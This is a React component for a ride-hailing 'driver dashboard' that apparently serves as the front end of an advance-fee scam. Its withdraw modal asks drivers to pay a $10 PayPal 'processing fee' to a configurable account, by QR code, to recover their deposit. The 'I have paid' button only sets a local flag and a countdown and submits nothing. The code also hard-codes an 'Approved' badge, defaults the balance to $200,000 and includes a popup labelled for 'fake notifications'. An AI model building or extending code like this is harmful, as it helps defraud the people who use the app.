import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { driverAPI, bankConfigAPI } from '../../services/api';
import AppPricingModal from './AppPricingModal';
import DownloadAppPage from './DownloadAppPage';
import './DriverDashboard.css';

type User = {
  _id: string;
  name: string;
  phone: string;
  carType: string;
  carYear: string;
  carImage?: string;
  status: 'pending' | 'approved' | 'rejected';
};

type DriverDashboardProps = {
  user: User;
  onLogout: () => void;
  onBack?: () => void;
};

const DriverDashboard = ({ user, onLogout, onBack }: DriverDashboardProps) => {
  const [activeTab, setActiveTab] = useState<'home' | 'activity' | 'notifications' | 'account'>('home');
  const [isOnline, setIsOnline] = useState(false);
  const [balance, setBalance] = useState(200000);
  const [monthlyTrips, setMonthlyTrips] = useState(0);
  const [totalTrips, setTotalTrips] = useState(0);
  const [loading, setLoading] = useState(true);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [errorMessage] = useState('');
  
  // Initialize withdraw state from localStorage
  const [withdrawRequested, setWithdrawRequested] = useState(() => {
    const saved = localStorage.getItem('withdraw_requested');
    return saved === 'true';
  });
  
  const [withdrawCooldown, setWithdrawCooldown] = useState(() => {
    const savedExpiry = localStorage.getItem('withdraw_expiry');
    if (savedExpiry) {
      const expiryTime = parseInt(savedExpiry, 10);
      const now = Date.now();
      const remainingSeconds = Math.max(0, Math.floor((expiryTime - now) / 1000));
      return remainingSeconds;
    }
    return 0;
  });

  const [showPricingModal, setShowPricingModal] = useState(false);
  const [showDownloadPage, setShowDownloadPage] = useState(false);
  const [paypalMe, setPaypalMe] = useState((import.meta as any).env?.VITE_PAYPAL_ME || '');
  useEffect(() => {
    bankConfigAPI.getBankConfig().then((res: any) => {
      if (res.data?.data?.paypalMe) setPaypalMe(res.data.data.paypalMe);
    }).catch(() => {});
  }, []);

  // Fetch driver stats from API
  useEffect(() => {
    const fetchStats = async () => {
      try {
        setLoading(true);
        const response = await driverAPI.getStats();
        const { balance, monthlyTrips, totalTrips } = response.data;
        
        setBalance(balance);
        setMonthlyTrips(monthlyTrips);
        setTotalTrips(totalTrips);
      } catch (error) {
        console.error('Error fetching driver stats:', error);
        // Keep default values if error
      } finally {
        setLoading(false);
      }
    };

    fetchStats();
  }, []);

  // Countdown timer for withdraw cooldown
  useEffect(() => {
    if (withdrawCooldown > 0) {
      const timer = setTimeout(() => {
        setWithdrawCooldown(withdrawCooldown - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (withdrawCooldown === 0 && withdrawRequested) {
      // Clear localStorage when cooldown expires
      setWithdrawRequested(false);
      localStorage.removeItem('withdraw_requested');
      localStorage.removeItem('withdraw_expiry');
    }
  }, [withdrawCooldown, withdrawRequested]);

  return (
    <div className="driver-dashboard">
      {/* Back button */}
      {onBack && (
        <button className="back-button" onClick={onBack}>
          ← Back to Home
        </button>
      )}
      
      {/* Main Content */}
      <div className="driver-content">
        {activeTab === 'home' && (
          <motion.div 
            className="home-tab"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
          >


            {/* Balance Card */}
            <div className="balance-card">
              <div className="balance-header">
                <div>
                  <h3>Current Balance</h3>
                  <p className="balance-subtitle">Your deposit minus completed rides</p>
                </div>
              </div>
              <div className="balance-amount">
                {loading ? '...' : `$${balance.toLocaleString('en-US')}`}
              </div>
            </div>

            {/* Quick Actions */}
            <div className="quick-actions">
              <button className="action-btn" onClick={() => setShowWithdrawModal(true)}>
                <span>Withdraw</span>
                <span className="arrow">›</span>
              </button>

            </div>

            {/* Stats Card */}
            <div className="stats-section">
              <h3>Ride Stats</h3>
              <div className="stats-grid">
                <div className="stat-item">
                  <div className="stat-icon">�</div>
                  <div className="stat-label">Rides completed this month</div>
                  <div className="stat-value">{loading ? '...' : monthlyTrips}</div>
                </div>
                <div className="stat-divider"></div>
                <div className="stat-item">
                  <div className="stat-icon stat-icon--success">✓</div>
                  <div className="stat-label">Total rides completed</div>
                  <div className="stat-value">{loading ? '...' : totalTrips}</div>
                </div>
              </div>
            </div>

            {/* Service Toggle */}
            <div className="service-toggle">
              <span className="toggle-label">Accept ride requests</span>
              <label className="toggle-switch">
                <input 
                  type="checkbox" 
                  checked={isOnline}
                  onChange={(e) => setIsOnline(e.target.checked)}
                />
                <span className="toggle-slider"></span>
              </label>
            </div>
          </motion.div>
        )}

        {activeTab === 'activity' && (
          <motion.div 
            className="activity-tab"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
          >
            <h2>Activity</h2>
            <div className="empty-state">
              <div className="empty-icon">📋</div>
              <p>No activity yet</p>
            </div>
          </motion.div>
        )}

        {activeTab === 'notifications' && (
          <motion.div 
            className="notifications-tab"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
          >
            <h2>Notifications</h2>
            <div className="empty-state">
              <div className="empty-icon">🔔</div>
              <p>No notifications yet</p>
            </div>
          </motion.div>
        )}

        {activeTab === 'account' && (
          <motion.div 
            className="account-tab"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
          >
            <h2>Account</h2>
            <div className="account-info">
              <div className="account-avatar">
                {user.carImage ? (
                  <img src={user.carImage} alt="Car" />
                ) : (
                  <div className="avatar-placeholder">🚗</div>
                )}
              </div>
              <div className="account-details">
                <h3>{user.name}</h3>
                <p>{user.phone}</p>
                <p className="car-info">{user.carType} - {user.carYear}</p>
                <span className="status-badge approved">Approved</span>
              </div>
            </div>
            <button className="logout-btn" onClick={onLogout}>
              🚪 Log Out
            </button>
          </motion.div>
        )}
      </div>

      {/* Bottom Navigation */}
      <nav className="bottom-nav">
        <button 
          className={`nav-item ${activeTab === 'home' ? 'active' : ''}`}
          onClick={() => setActiveTab('home')}
        >
          <span className="nav-icon">🏠</span>
          <span className="nav-label">Home</span>
        </button>
        <button 
          className={`nav-item ${activeTab === 'activity' ? 'active' : ''}`}
          onClick={() => setActiveTab('activity')}
        >
          <span className="nav-icon">📋</span>
          <span className="nav-label">Activity</span>
        </button>
        <button 
          className={`nav-item ${activeTab === 'notifications' ? 'active' : ''}`}
          onClick={() => setActiveTab('notifications')}
        >
          <span className="nav-icon">🔔</span>
          <span className="nav-label">Notifications</span>
        </button>
        <button 
          className={`nav-item ${activeTab === 'account' ? 'active' : ''}`}
          onClick={() => setActiveTab('account')}
        >
          <span className="nav-icon">👤</span>
          <span className="nav-label">Account</span>
        </button>
      </nav>

      {/* Withdraw Modal */}
      <AnimatePresence>
        {showWithdrawModal && (
          <div className="modal" role="dialog" aria-modal="true">
            <motion.div 
              className="modal__backdrop" 
              onClick={() => setShowWithdrawModal(false)} 
              initial={{ opacity: 0 }} 
              animate={{ opacity: 1 }} 
              exit={{ opacity: 0 }} 
            />
            <motion.div 
              className="modal__panel" 
              initial={{ opacity: 0, y: 40 }} 
              animate={{ opacity: 1, y: 0 }} 
              exit={{ opacity: 0, y: 20 }}
            >
              <div className="modal__header">
                <div className="modal__title">Withdraw Deposit</div>
                <button 
                  className="modal__close" 
                  onClick={() => setShowWithdrawModal(false)} 
                  aria-label="Close"
                >
                  ×
                </button>
              </div>
              <div style={{ padding: '8px 16px', overflowY: 'auto', flex: 1, maxHeight: 'calc(90vh - 60px)', WebkitOverflowScrolling: 'touch' }}>
                <p style={{ marginTop: 0, fontSize: 15, lineHeight: 1.6, color: '#374151' }}>
                  To withdraw your deposit and close your account, please send a $10 processing fee via PayPal below. Admin will refund your full deposit within 24 hours.
                </p>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 12 }}>
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(`https://paypal.me/${paypalMe}/10`)}&bgcolor=ffffff&color=003087&margin=10`}
                    alt="PayPal QR"
                    style={{ width: 200, height: 200, borderRadius: 12, boxShadow: '0 4px 16px rgba(0,0,0,.10)', border: '2px solid #e5e7eb' }}
                  />
                  <div style={{ fontSize: 12, color: '#555', textAlign: 'center' }}>Or open: <a href={`https://paypal.me/${paypalMe}/10`} target="_blank" rel="noopener noreferrer" style={{ color: '#0070ba', fontWeight: 700 }}>paypal.me/{paypalMe}/10</a></div>
                  <button
                    onClick={() => { alert('Scan the QR code above with your phone to pay via PayPal.'); }}
                    style={{
                      background: 'white',
                      color: '#1f2937',
                      border: '2px solid #e5e7eb',
                      borderRadius: '12px',
                      padding: '12px 24px',
                      fontSize: '14px',
                      fontWeight: '600',
                      cursor: 'pointer',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '8px',
                      boxShadow: '0 2px 8px rgba(0, 0, 0, 0.08)',
                      transition: 'all 0.3s ease'
                    }}
                    onMouseOver={(e) => {
                      e.currentTarget.style.transform = 'translateY(-2px)';
                      e.currentTarget.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.12)';
                      e.currentTarget.style.borderColor = '#d1d5db';
                    }}
                    onMouseOut={(e) => {
                      e.currentTarget.style.transform = 'translateY(0)';
                      e.currentTarget.style.boxShadow = '0 2px 8px rgba(0, 0, 0, 0.08)';
                      e.currentTarget.style.borderColor = '#e5e7eb';
                    }}
                  >
                    <span>📥</span>
                    <span>Save Payment Info</span>
                  </button>
                </div>
                <div style={{ marginTop: 12, fontSize: 13, color: '#444' }}>
                  PayPal note: <strong>Withdraw deposit - {user?.phone}</strong>
                </div>
                <div style={{ display: 'flex', gap: 12, marginTop: 16, marginBottom: 16 }}>
                  <button
                    className="submit"
                    disabled={withdrawRequested}
                    onClick={() => {
                      // Handle withdrawal confirmation
                      const expiryTime = Date.now() + 60000; // 60 seconds from now
                      
                      setWithdrawRequested(true);
                      setWithdrawCooldown(60);
                      
                      // Save to localStorage
                      localStorage.setItem('withdraw_requested', 'true');
                      localStorage.setItem('withdraw_expiry', expiryTime.toString());
                      
                      alert('Withdrawal request submitted. Admin will process it within 24 hours.');
                    }}
                    style={{ 
                      flex: 1,
                      opacity: withdrawRequested ? 0.6 : 1,
                      cursor: withdrawRequested ? 'not-allowed' : 'pointer',
                      fontSize: withdrawRequested ? '13px' : '15px'
                    }}
                  >
                    {withdrawRequested 
                      ? `Request submitted — waiting for admin. Try again in ${withdrawCooldown}s`
                      : 'I have paid — Request Withdrawal'
                    }
                  </button>
                  <button 
                    className="sheet__cancel" 
                    onClick={() => setShowWithdrawModal(false)} 
                    style={{ flex: 1 }}
                  >
                    Later
                  </button>
                </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Error Popup for Fake Notifications */}
      <AnimatePresence>
        {showErrorPopup && (
          <div className="error-popup-overlay" onClick={() => setShowErrorPopup(false)}>
            <motion.div
              className="error-popup"
              onClick={(e) => e.stopPropagation()}
              initial={{ opacity: 0, scale: 0.8, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.8, y: 20 }}
              transition={{ type: "spring", duration: 0.5 }}
            >
              <div className="error-popup-icon">
                <motion.div
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  transition={{ delay: 0.2, type: "spring", stiffness: 200 }}
                >
                  ⚠️
                </motion.div>
              </div>
              <h3 className="error-popup-title">Ride Taken</h3>
              <p className="error-popup-message">{errorMessage}</p>
              <button
                className="error-popup-btn"
                onClick={() => setShowErrorPopup(false)}
              >
                Got it
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      <AppPricingModal 
        isOpen={showPricingModal} 
        onClose={() => setShowPricingModal(false)}
        onConfirm={(plan) => {
          localStorage.setItem('driver_app_plan', plan.id);
          setShowPricingModal(false);
          setShowDownloadPage(true);
        }}
      />

      {showDownloadPage && (
        <DownloadAppPage 
          user={user} 
          onBack={() => setShowDownloadPage(false)} 
        />
      )}
    </div>
  );
};

export default DriverDashboard;
